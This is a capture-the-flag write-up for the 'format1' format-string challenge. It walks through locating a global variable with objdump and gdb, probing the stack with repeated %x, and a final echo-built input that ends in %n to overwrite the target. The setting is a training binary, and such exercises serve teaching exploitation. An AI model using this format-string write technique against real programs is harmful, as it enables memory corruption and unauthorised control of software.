In this challenge we wish to modify the global variable target which sits in the uninitialized data section (.bss).  First we examine the binary via objdump -d ./format1, and notice the address of target loaded into %eax in order to compare test for 0 at line 8048405:.  We'll keep this address in mind when building our exploit.

Next, we can use gdb to get an idea for where on the stack our format string lives, that is, argv[1].
Then, we get the value for %esp at the call to printf.  This will give us a rough estimate of the distance on the stack from where printf expects to see its first arguments to the area we control on the stack vie direct input.

Taking the difference between those 2 addressed devided by 4 gives us a good starting point for our first inputs.  We simply give as input a few easily recognized bytes, then, based on the number we just calculated we pad the back side of our tell bytes with %x.
So, our first input may look something like 12345678%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x

The %x characters in our format string will cause printf to print values on the stack.  We analyze the output to find the tell values, trim excess %x from the back side of our input and find the first 4 bytes of our input that align to a full int argument on the stack.
Finally, we replace the four tell values which print as an int, and replace them with the address of target found above (accounting for endianess).

Our final input is as follows:

./format1 `echo -e "123\x38\x96\x04\x088%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n"`

Note, this analysis was performed on a machine other than the VM provided by the challenges.  Hence, my solution will likely differ from yours.  But the methodology should be machine independent.
